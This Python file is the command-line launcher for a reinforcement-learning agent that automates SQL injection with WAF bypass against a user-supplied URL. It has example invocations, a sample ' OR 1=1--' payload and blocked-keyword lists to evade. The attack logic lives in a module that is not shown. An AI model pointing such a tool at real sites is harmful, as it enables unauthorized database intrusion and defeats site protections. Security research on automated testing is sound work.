#!/usr/bin/env python3
"""
Command-line interface for SQL Injection RL Agent
Allows users to specify injection point and other parameters
"""

import argparse
import sys
from main import SQLiRLTrainer


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='SQL Injection RL Agent with WAF Bypass',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage with default injection point (id=1)
  python run_sqli_rl.py --url "https://example.com/vuln.php" --param id

  # Custom injection point
  python run_sqli_rl.py --url "https://example.com/vuln.php" --param id --injection-point "2"

  # POST method with custom parameters
  python run_sqli_rl.py --url "https://example.com/login.php" --param username --method POST --injection-point "admin"

  # Debug mode with fewer episodes
  python run_sqli_rl.py --url "https://example.com/vuln.php" --episodes 5 --max-steps 10 --debug

  # With custom blocked keywords
  python run_sqli_rl.py --url "https://example.com/vuln.php" --blocked-keywords SELECT UNION DROP

  # Using blocked keywords from file
  python run_sqli_rl.py --url "https://example.com/vuln.php" --blocked-keywords-file blocked_words.txt

  # Full training run
  python run_sqli_rl.py --url "https://example.com/vuln.php" --episodes 1000 --no-debug
        """
    )
    
    # Required arguments
    parser.add_argument(
        '--url', 
        required=True,
        help='Target URL (base URL without parameters for GET, full URL for POST)'
    )
    
    parser.add_argument(
        '--param', 
        default='id',
        help='Parameter name to inject into (default: id)'
    )
    
    # Optional arguments
    parser.add_argument(
        '--injection-point', 
        default='-1',
        help='Base value to inject after (default: 1). Final URL will be: url?param=injection_point+payload'
    )
    
    parser.add_argument(
        '--method', 
        choices=['GET', 'POST'],
        default='GET',
        help='HTTP method (default: GET)'
    )
    
    parser.add_argument(
        '--episodes', 
        type=int,
        default=100,
        help='Number of training episodes (default: 100)'
    )
    
    parser.add_argument(
        '--max-steps', 
        type=int,
        default=50,
        help='Maximum steps per episode (default: 50)'
    )
    
    parser.add_argument(
        '--learning-rate', 
        type=float,
        default=0.001,
        help='Learning rate for DQN (default: 0.001)'
    )
    
    parser.add_argument(
        '--temperature', 
        type=float,
        default=2.0,
        help='Initial temperature for Boltzmann exploration (default: 2.0)'
    )
    
    parser.add_argument(
        '--debug', 
        action='store_true',
        help='Enable debug mode with detailed output'
    )
    
    parser.add_argument(
        '--no-debug', 
        action='store_true',
        help='Disable debug mode (overrides --debug)'
    )
    
    parser.add_argument(
        '--debug-freq', 
        type=int,
        default=1,
        help='Debug output frequency (every N steps, default: 1)'
    )
    
    parser.add_argument(
        '--save-freq', 
        type=int,
        default=100,
        help='Model save frequency (every N episodes, default: 100)'
    )
    
    parser.add_argument(
        '--log-freq', 
        type=int,
        default=10,
        help='Log output frequency (every N episodes, default: 10)'
    )
    
    parser.add_argument(
        '--model-path', 
        default='models/',
        help='Directory to save models (default: models/)'
    )
    
    parser.add_argument(
        '--log-path',
        default='logs/',
        help='Directory to save logs (default: logs/)'
    )

    parser.add_argument(
        '--blocked-keywords',
        nargs='*',
        help='List of keywords that should be bypassed (e.g., --blocked-keywords SELECT UNION DROP)'
    )

    parser.add_argument(
        '--blocked-keywords-file',
        type=str,
        help='Path to text file containing blocked keywords (one per line, overrides --blocked-keywords)'
    )

    parser.add_argument(
        '--retrain-model',
        type=str,
        help='Path to model file to resume training from (optional)'
    )    

    return parser.parse_args()


def main():
    """Main function"""
    args = parse_arguments()
    
    # Determine debug mode
    debug_mode = args.debug and not args.no_debug
    
    # Determine blocked keywords source
    blocked_keywords = None
    if args.blocked_keywords_file:
        # File path takes priority
        blocked_keywords = args.blocked_keywords_file
        print(f"📁 Using blocked keywords from file: {args.blocked_keywords_file}")
    elif args.blocked_keywords:
        # Use provided list
        blocked_keywords = args.blocked_keywords
        print(f"📝 Using custom blocked keywords: {', '.join(args.blocked_keywords)}")
    else:
        print("🛡️ Using default blocked keywords")

    # Build configuration
    config = {
        'target_url': args.url,
        'parameter': args.param,
        'injection_point': args.injection_point,
        'method': args.method,
        'num_episodes': args.episodes,
        'max_steps_per_episode': args.max_steps,
        'learning_rate': args.learning_rate,
        'initial_temperature': args.temperature,
        'save_frequency': args.save_freq,
        'log_frequency': args.log_freq,
        'debug_mode': debug_mode,
        'debug_frequency': args.debug_freq,
        'model_save_path': args.model_path,
        'log_save_path': args.log_path,
        'blocked_keywords': blocked_keywords,
        'retrain_model': args.retrain_model,
    }
    
    # Display configuration
    print("🚀 SQL Injection RL Agent")
    print("=" * 50)
    print(f"Target URL: {args.url}")
    print(f"Parameter: {args.param}")
    print(f"Injection Point: {args.injection_point}")
    print(f"Method: {args.method}")
    print(f"Episodes: {args.episodes}")
    print(f"Max Steps: {args.max_steps}")
    print(f"Debug Mode: {'✅ ON' if debug_mode else '❌ OFF'}")
    
    if debug_mode:
        print(f"Debug Frequency: Every {args.debug_freq} step(s)")
    
    print("\n📝 Example Final URLs:")
    if args.method == 'GET':
        print(f"  Empty payload: {args.url}?{args.param}={args.injection_point}")
        print(f"  With payload: {args.url}?{args.param}={args.injection_point}' OR 1=1--")
    else:
        print(f"  POST to: {args.url}")
        print(f"  Data: {args.param}={args.injection_point}[payload]")
    
    print("\n" + "=" * 50)
    
    try:
        # Create and run trainer
        trainer = SQLiRLTrainer(config)
        trainer.train()
        
        print("\n✅ Training completed successfully!")
        
    except KeyboardInterrupt:
        print("\n⚠️ Training interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Error during training: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
